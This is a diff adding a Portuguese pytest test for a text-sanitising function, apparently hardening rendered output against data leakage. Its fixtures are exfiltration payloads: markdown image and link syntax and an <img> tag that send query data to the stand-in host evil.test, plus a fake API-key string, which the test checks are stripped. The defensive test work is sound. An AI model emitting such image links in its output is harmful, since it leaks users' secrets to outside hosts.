@@ -33,3 +33,21 @@ def test_nunca_sobra_mencao_nem_html(texto: str) -> None:
         and (saida[i + 1].isalnum() and saida[i + 1].isascii())
         for i in range(len(saida))
     )
+
+
+@pytest.mark.parametrize(
+    "texto",
+    [
+        "![x](https://evil.test/?d=segredo)",
+        "![x][r]\n\n[r]: https://evil.test/?d=1",
+        "[clique](https://evil.test/?d=1)",
+        "veja https://evil.test/?d=1 e www.evil.test/x",
+        "![![a](u)](u2)",
+        "<img src=https://evil.test/?d=1>",
+        "uma chave sk-ant-api03-abcdefghijklmnopqrstu",
+    ],
+)
+def test_canais_de_exfiltracao_sao_fechados(texto: str) -> None:
+    saida = neutralizar_texto(texto)
+    assert "://" not in saida and "www." not in saida and "![" not in saida
+    assert "](" not in saida and "<" not in saida and "sk-ant" not in saida
